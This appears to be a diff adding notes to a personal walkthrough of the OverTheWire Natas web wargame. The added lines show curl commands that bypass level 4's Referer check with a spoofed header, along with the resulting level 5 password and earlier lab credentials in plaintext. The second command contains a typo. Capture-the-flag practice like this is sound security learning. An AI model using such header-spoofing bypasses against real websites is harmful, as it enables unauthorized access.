@@ -51,3 +51,13 @@ natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
 http://natas4.natas.labs.overthewire.org/
 User and password: natas4
 Password : tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
+
+curl -u natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm http://natas4.natas.labs.overthewire.org/ -H "host: http://natas5.natas.labs.overthewire.org/"
+
+Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
+
+Using a curl mode, is -e for reference url, this is a solution:
+xcurl -u natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm http://natas4.natas.labs.overthewire.org/ -e 'http://natas5.natas.labs.overthewire.org/'
+
+
+Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
